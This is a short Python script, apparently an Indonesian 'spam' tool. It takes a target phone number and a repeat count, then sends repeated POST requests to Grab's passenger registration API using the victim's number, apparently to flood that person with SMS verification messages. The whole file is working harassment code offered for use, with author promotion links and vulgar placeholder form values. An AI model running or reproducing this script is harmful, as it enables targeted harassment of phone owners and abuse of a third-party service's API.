from multiprocessing.pool import ThreadPool
try:
	import requests
	import os
except ModuleNotFoundError:
	print("\033[91m[!] install requests dulu gan")
	print("\033[95m$ pip install reqests")
	exit()
#warna
class warna:
    p = '\033[95m'
    b = '\033[94m'
    g = '\033[92m'
    y = '\033[93m'
    r = '\033[91m'
#eksekusi
try:
	os.system('clear')
	print ("""\033[92m                                                     
   _________  ____ _____ ___     _________ ___  _____
  / ___/ __ \/ __ `/ __ `__ \   / ___/ __ `__ \/ ___/
 (__  ) /_/ / /_/ / / / / / /  (__  ) / / / / (__  ) 
/____/ .___/\__,_/_/ /_/ /_/  /____/_/ /_/ /_/____/  
    /_/                                              """)
	print ("[~] SPAM TELFON GRAB [~]")
	print ("Github : https://github.com/Hacketindonedia1\nYoutube: https://www.youtube.com/channel/UCMiQsqzWvj-zKxNlFlG_Wiw")
	print ("\033[93m[!] Masukan Nomer Menggunakan 628")
	c = input("\033[95m[+] Nomer Target : \033[0m")
	b=int(input("\033[95m[+] Masukan Jumlah : \033[0m"))
except ValueError:
	print ("\033[91m[!] isi yang bener gan")
	exit()
print("\033[0m~status mengirim~")
#script
def a(a):
	try:
		jun=('phoneNumber')
		req = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', 
		data={'phoneNumber':c, 'countryCode': 'ID', 'name': 'kontol', 'email': 'memek@gmail.com', 'deviceToken': '*'}, 
		headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
		if str(jun) in str(req.text):
			print("\033[92m[200OK] Sukses Mengirim")
		else:
			print("\033[91m[404] Gagal Mengirim")
	except: pass

s = []
for i in range(b):
    s.append(i)
p=ThreadPool(1)
p.map(a,s)
print("\033[34;1mselesai")
